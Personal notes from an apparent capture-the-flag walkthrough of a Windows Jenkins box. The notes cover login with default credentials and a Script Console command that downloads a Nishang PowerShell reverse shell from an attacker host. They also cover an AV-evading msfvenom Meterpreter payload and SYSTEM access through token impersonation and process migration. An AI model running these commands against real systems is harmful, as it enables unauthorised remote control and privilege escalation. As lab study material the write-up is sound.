#Web #Powershell 
## Initial Access

Jenkins is a tool used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it.

We will use [Nishang](https://github.com/samratashok/nishang), in this case the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

Found a Jenkins login portal on port 8080, login credentials are admin:admin (found by guessing).

Can execute commands in Manage Jenkins -> Script Console.

Executed the reverse shell using `"powershell iex (New-Object Net.WebClient).DownloadString('http://<ip address>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ip address> -Port <port>".execute()`
`

## Switching Shells

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o <output file name>.exe` - Used this command to create a Meterpreter shell, payload is encoded to ensure it transmitted correctly and to evade AV.

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip address>:8000/shell-name.exe','shell-name.exe')"` - Used this command to download the shell to the target machine.

Set up an `exploit/multi/handler` at Metasploit.

`Start-Process "<file name>"` - Start the reverse shell on the target machine.

## Privilege Escalation

We will use token impersonation to gain system access.

Account tokens which defines privileges are a assigned to an account when a user logs in or authenticates, this is usually done by LSASS.exe.

The access token consists of:

- User SIDs
- Group SIDs
- Privileges

The 2 access token types:

- Primary access tokens: Associated with a user account and generated at login.
- Impersonation tokens: Allow a particular process to gain access to a resource using the token of another.

There are different levels for impersonation tokens:

- SecurityAnonymous: current user/client cannot impersonate another user/client.
- SecurityIdentification: current user/client can get the identity or privileges of a client, but can't impersonate the client.
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system.
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system.

Security context is a data structure which contains users' relevant security information.

Most commonly abused privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

`whoami /priv` - List all privileges, found 2 useful ones that are enabled, SeDebugPrivilege and SeImpersonatePrivilege.

We will use the incognito module to exploit this vulnerability.

`load incognito` or `use incognito` - Load the incognito module into Metasploit.

`list_tokens -g` - Check which tokens are available, found the BUILTIN\Administrators token is available.

`impersonate "BUILTIN\Administrators"` - Impersonate the administrators' token.

`getuid` - Confirm you have SYSTEM privileges.

Since Windows uses the primary token of the process and not the impersonation one, you might still not have the permissions of a privileged user even with a higher privileged token.

`ps` - List processes.

`migrate <process PID>` - Migrate to a process with higher privileges.